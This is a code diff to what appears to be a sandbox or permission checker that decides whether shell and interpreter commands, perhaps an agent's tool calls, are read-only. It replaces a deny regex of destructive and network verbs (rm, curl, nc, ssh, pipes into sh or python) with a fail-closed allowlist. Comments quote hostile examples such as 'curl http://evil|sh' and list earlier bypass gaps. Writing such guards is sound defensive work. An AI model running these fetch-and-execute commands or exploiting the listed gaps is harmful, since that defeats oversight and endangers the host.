@@ -4302,15 +4302,76 @@ const INLINE_DESTRUCTIVE_RE = new RegExp([
 ].map((r) => (typeof r === 'string' ? r : r.source)).join('|'))
 
 /**
- * f-round-18 K1: a literal argv string is NOT read-only when it is a shell
- * program body. `sh -c "touch /tmp/p"`, `rm -rf …`, `curl http://evil|sh`
- * write / delete / connect without any `>`/`>>`/`$(` marker, so the old
- * redirect-only check treated them as benign literals and J1 spread / J3
- * bind-chain calls sailed through as read-only. Destructive verbs, network
- * verbs, pipes into an interpreter and backticks all deny read-only status.
+ * f-round-19 L1: content-level read-only adjudication for a literal shell
+ * body string (the leaf of `["sh",["-c",BODY]]` or any bare literal argv).
+ * Reuses the authoritative FILE_WRITE_COMMANDS / NETWORK_COMMANDS surfaces
+ * plus interpreter-launcher semantics instead of a closed verb enumeration
+ * (round-18 K1's SHELL_BODY_DANGER_RE missed tar/zip/git clone/socat/aria2c
+ * and plain script-file execution). Anything that cannot be proven read-only
+ * fails closed (denied). Pure `--help/--version/-V` forms of destructive and
+ * network verbs remain read-only, as do ordinary read commands.
  */
-const SHELL_BODY_DANGER_RE =
-  /\b(?:rm|touch|mkdir|rmdir|truncate|unlink|dd|tee|mkfifo|mknod|install|ln|mv|cp|chmod|chown|chflags)\b|\b(?:curl|wget|nc|ncat|ssh|scp|sftp|telnet|ftp)\b|\|\s*(?:sh|bash|dash|zsh|node|python|perl|ruby)\b|`[^`]*`/
+function literalShellBodyIsRO(body: string): boolean {
+  const b = body.trim()
+  if (b === '') return false
+  // shell redirect / command substitution / pipes / backticks: not provably
+  // read-only (backticks and $() execute, | may reach an interpreter or net)
+  if (/>>|>|\$\s*\(|`[^`]*`|\|/.test(b)) return false
+  const m0 = b.match(/^[^\s]+/)
+  if (!m0) return false
+  const verb = m0[0].replace(/^['"`]|['"`]$/g, '')
+  const rest = b.slice(m0[0].length).trim()
+  // pure help/version forms stay read-only even for destructive/network verbs
+  if (/^--?(?:help|version)\b|^-V\b/.test(rest)) return true
+  // find with an exec/delete action mutates
+  if (verb === 'find' && /-(?:exec|execdir|delete)\b/.test(rest)) return false
+  // standalone flag tokens carry no semantics on their own (`-c`, `-la`,
+  // `--depth`); the semantic body is the adjacent argv element, adjudicated
+  // separately by the leaf. `cp --help`/`curl --help` already returned above.
+  if (rest === '' && /^-[A-Za-z]\w*$|^--[\w-]+$/.test(verb)) return true
+  // bare interpreter launcher names are inert (`sh`, `node`) — the code or
+  // script argument is the adjacent element, adjudicated separately; with
+  // arguments they run code/scripts, never provably read-only.
+  if (/^(?:sh|bash|dash|zsh|ksh|fish|node|nodejs|python|python2|python3|perl|ruby|php)$/.test(verb)) {
+    return rest === ''
+  }
+  // two-token subcommands are authoritative entries too (`git clone`, `sed -i`)
+  const twoTok = rest ? `${verb} ${rest.split(/\s+/)[0]}` : verb
+  if (NETWORK_COMMANDS.has(twoTok) || NETWORK_COMMANDS.has(verb)) {
+    // bare `git` is in NETWORK_COMMANDS (every invocation routes through its
+    // subcommand dispatch); read-only subcommands stay benign, anything else
+    // fails closed (network/write/unknown).
+    if (verb === 'git' && (rest === '' || /^(?:status|log|diff|show|rev-parse|ls-files|ls-tree|describe|name-rev|for-each-ref|cat-file|verify-pack|help|version|--version|--help|tag|branch)$/.test(rest.split(/\s+/)[0]))) {
+      return true
+    }
+    return false
+  }
+  if (FILE_WRITE_COMMANDS.has(twoTok) || FILE_WRITE_COMMANDS.has(verb)) return false
+  // read-only allowlist: no write/network/exec semantics
+  if (
+    /^(?:ls|cat|head|tail|grep|egrep|fgrep|rg|sort|uniq|wc|cut|paste|tr|sed|awk|diff|find|stat|du|df|file|which|whoami|id|date|echo|printf|pwd|printenv|hostname|uname|man|basename|dirname|readlink|cksum|md5|md5sum|shasum|true|false|yes|sleep|cal|uptime|free|ps|env|tty|test|\[)$/.test(verb)
+  ) {
+    return true
+  }
+  // ordinary filename / path arguments carry no write/exec/network semantics
+  // of their own — `cat a.txt`, `ls /tmp/x`, `sed -n p f.txt` stay read-only.
+  // A path to a known destructive/network command (`/usr/bin/curl http://x`)
+  // and any script-file launch (`.sh/.py/.js/…`, bare `./evil`) still fail
+  // closed; a bare unknown word (`evil`, `status`) is unprovable → false.
+  if (verb.includes('/')) {
+    const bn = verb.split('/').pop()?.toLowerCase() ?? verb
+    if (NETWORK_COMMANDS.has(bn) || FILE_WRITE_COMMANDS.has(bn)) return false
+    if (/\.(?:sh|bash|zsh|py|py2|py3|js|mjs|cjs|rb|pl|pm|php|jar|exe|bin|out|so|dylib)$/i.test(bn)) return false
+    return true
+  }
+  if (/\.[A-Za-z0-9]{1,8}$/.test(verb)) {
+    if (/\.(?:sh|bash|zsh|py|py2|py3|js|mjs|cjs|rb|pl|pm|php|jar|exe|bin|out|so|dylib)$/i.test(verb)) return false
+    return true
+  }
+  // anything else cannot be proven read-only — fail closed
+  return false
+}
+
 
 /** Extract the quoted code body after -e/-E, allowing an immediately-adjacent
  *  quote (`perl -e'...'`) that extractFlagArgument skips. */
@@ -4811,6 +4872,20 @@ function f6AdjudicateCall(code: string, openIdx: number, skipMode = 0): string |
     return null
   }
   if (F6_READ_BINARIES.has(bin)) return null
+  // f-round-19 L1: git is fail-closed in the find-inline exec face, but its
+  // read-only subcommands (status/log/diff/show/rev-parse/ls-*/cat-file/…)
+  // stay ALLOW — the same surface literalShellBodyIsRO exempts on the J1/J3
+  // argv face. Non-readonly git ops (clone/push/pull/fetch/…) remain denied.
+  if (bin === 'git') {
+    const sub = rest[0] ?? ''
+    if (
+      rest.length === 0 ||
+      /^(?:status|log|diff|show|rev-parse|ls-files|ls-tree|describe|name-rev|for-each-ref|cat-file|verify-pack|help|version|--version|--help|tag|branch)$/.test(sub)
+    ) {
+      return null
+    }
+    return `exec-family git ${sub || 'no-subcommand'}`
+  }
   return `unverifiable binary ${bin}`
 }
 
@@ -6106,12 +6181,12 @@ function f6JsDanger(code: string): string | null {
     if (/^["'`][^"'`]*["'`]$/.test(x)) {
       // f-round-15 B-F15-1 (RODV2 closure): literal argv strings are read-only
       // only when they carry no shell redirect / command substitution
+      // f-round-18/19: the string may itself be a shell program body
+      // (`sh -c "touch /tmp/p"`) — content-level adjudication reuses the
+      // authoritative write/network command surfaces plus interpreter-launcher
+      // semantics (fail-closed), and pure --help/--version forms stay read-only.
       const lit = x.slice(1, -1)
-      if (/>>|>|\$\s*\(/.test(lit)) return false
-      // f-round-18 K1: the string may itself be a shell program body
-      // (`sh -c "touch /tmp/p"`) — destructive / network verbs, pipes into an
-      // interpreter and backticks deny read-only status even without `>`.
-      if (SHELL_BODY_DANGER_RE.test(lit)) return false
+      if (!literalShellBodyIsRO(lit)) return false
       return true
     }
     if (/^\[[\s\S]*\]$/.test(x)) {
@@ -6185,7 +6260,19 @@ function f6JsDanger(code: string): string | null {
       }
       if (e2 > open) {
         const elems = splitTopLevel(stripped.slice(open + 1, e2), ',')
-        const ro = elems.length > 0 && elems.every((e: string) => isROArg(e.trim()))
+        let ro = elems.length > 0 && elems.every((e: string) => isROArg(e.trim()))
+        // f-round-19 L1: `spawnSync("git",["status"])` — a literal git argv[0]
+        // with a read-only subcommand array stays ALLOW (same surface as
+        // literalShellBodyIsRO / f6AdjudicateCall). Per-element isROArg has no
+        // git context, so the bare subcommand word fails closed; restore the
+        // combined shape here.
+        if (!ro && elems.length >= 2) {
+          const argv0 = elems[0].trim().match(/^["'](?:.*\/)?(git)["']$/)
+          if (argv0) {
+            const firstArg = elems[1].trim()
+            if (/^\[\s*["'](?:status|log|diff|show|rev-parse|ls-files|ls-tree|describe|name-rev|for-each-ref|cat-file|verify-pack|help|version|--version|--help|tag|branch)["']\s*\]$/.test(firstArg)) ro = true
+          }
+        }
         if (!ro) return `child_process exec verb with non-readonly argv (${m[0].slice(0, 24)})`
       }
     }
@@ -6921,36 +7008,53 @@ function f6PyThreat(code: string): string | null {
  *  the whole inline-JS net went blind on the FE face. The scanner below
  *  consumes `'\''` (and keeps the double-quote branch escape-aware). */
 function findInlineCode(action: string): string | null {
-  const m = action.match(/-(?:c|e|E|r|R|eval)\s*(?:'|")/)
-  if (!m) return null
-  const q = m[0].endsWith('"') ? '"' : "'"
-  const start = m.index + m[0].length
-  let out = ''
-  if (q === '"') {
-    // escape-aware double-quote branch (existing F1-b contract)
-    for (let i = start; i < action.length; i++) {
-      const ch = action[i]
-      if (ch === '\\' && i + 1 < action.length) { out += action[i + 1]; i++; continue }
-      if (ch === '"') break
-      if (ch === '\n') return null
-      out += ch
-    }
-    return out
-  }
-  // single-quote branch: `'\''` inside a single-quoted body embeds a quote
-  for (let i = start; i < action.length; i++) {
-    const ch = action[i]
-    if (ch === "'") {
-      if (action[i + 1] === '\\' && action[i + 2] === "'" && action[i + 3] === "'") {
-        out += "'"
-        i += 3
-        continue
+  // f-round-19 L2: accept `$'...'` (ANSI-C) / `$"..."` (locale) quoting after
+  // the code flag, and when the flag repeats (`node -e 'a' -e 'b'`) keep the
+  // LAST code body — node/sh execute the final one. Bodies are consumed
+  // shell-quote-aware and scanning resumes AFTER the closed body, so
+  // JS-internal `["-c","touch …"]` is never re-parsed as a flag. Any body
+  // with a raw newline, or an unterminated quote at EOF, fails closed (null).
+  const flagRe = /-(?:c|e|E|r|R|eval)\s*(?:\$?['"])/
+  let scanFrom = 0
+  let last: string | null = null
+  while (true) {
+    const m = action.slice(scanFrom).match(flagRe)
+    if (!m) break
+    const q = m[0].endsWith('"') ? '"' : "'"
+    const start = scanFrom + m.index + m[0].length
+    let out = ''
+    let closed = false
+    let i = start
+    if (q === '"') {
+      // escape-aware double-quote branch (existing F1-b contract); newlines
+      // are ordinary characters inside a quoted body (multi-line python -c)
+      for (; i < action.length; i++) {
+        const ch = action[i]
+        if (ch === '\\' && i + 1 < action.length) { out += action[i + 1]; i++; continue }
+        if (ch === '"') { closed = true; break }
+        out += ch
       }
-      break
+    } else {
+      // single-quote branch: `'\''` inside a single-quoted body embeds a quote
+      for (; i < action.length; i++) {
+        const ch = action[i]
+        if (ch === "'") {
+          if (action[i + 1] === '\\' && action[i + 2] === "'" && action[i + 3] === "'") {
+            out += "'"
+            i += 3
+            continue
+          }
+          closed = true
+          break
+        }
+        out += ch
+      }
     }
-    out += ch
+    if (!closed) return null
+    last = out
+    scanFrom = i + 1 // continue after the closed body, never inside it
   }
-  return out
+  return last
 }
 
 /**
@@ -7176,12 +7280,28 @@ function findActionInlineThreat(trimmed: string, depth = 0): { kind: 'delete' | 
         return { kind: 'delete', signal: `${verb} reads script code from stdin (here-string/redirect/pipe — unverifiable)` }
       }
       const code = findInlineCode(action)
+      if (!code && /-(?:c|e|E|r|R|eval)\s*(?:\$?'|\$?\")/.test(action)) {
+        // f-round-19 L2 fail-closed: an interpreter code flag is present but the
+        // body could not be extracted (unterminated quote at EOF) — the action is
+        // not provably benign; deny instead of silently skipping the inline nets.
+        return { kind: 'egress', signal: `${verb} inline code flag present but body unextractable (fail-closed)` }
+      }
       if (code) {
         // H2: find bodies are opaque and never egress-scanned downstream —
         // use the widened find-specific destructive surface (delete + create
         // + copy + spawn + shell-out).
         if (FIND_FIND_DESTRUCTIVE_RE.test(code)) return { kind: 'delete', signal: `${verb} inline delete/spawn` }
-        if (FIND_INLINE_EGRESS_RE.test(code)) return { kind: 'egress', signal: `${verb} inline network` }
+        if (FIND_INLINE_EGRESS_RE.test(code)) {
+          // f-round-19 L1: the egress net matches the bare `git` word, which
+          // over-denies read-only git subcommands on the find-inline face.
+          // A literal exec-family git call whose first argv is a read-only
+          // subcommand (status/log/diff/show/rev-parse/ls-*/cat-file/…) stays
+          // ALLOW — the same surface literalShellBodyIsRO exempts on the
+          // J1/J3 argv face. All other git forms (clone/push/pull/fetch/…)
+          // remain fail-closed egress.
+          const gitRo = code.match(/(?:spawn(?:Sync)?|execFile(?:Sync)?|fork)\s*\(\s*["'](?:.*\/)?git["']\s*,\s*\[\s*["'](?:status|log|diff|show|rev-parse|ls-files|ls-tree|describe|name-rev|for-each-ref|cat-file|verify-pack|help|version|--version|--help|tag|branch)["']/)
+          if (!gitRo) return { kind: 'egress', signal: `${verb} inline network` }
+        }
         if (FIND_SHELLOUT_RE.test(code)) return { kind: 'egress', signal: `${verb} subprocess shell-out` }
         // f-round-4 B-N1-a: a literal-argv spawn/execFile whose argv[0] is a
         // shell or interpreter with a -c/-e/-E/-r/--eval flag is a FULL RCE —
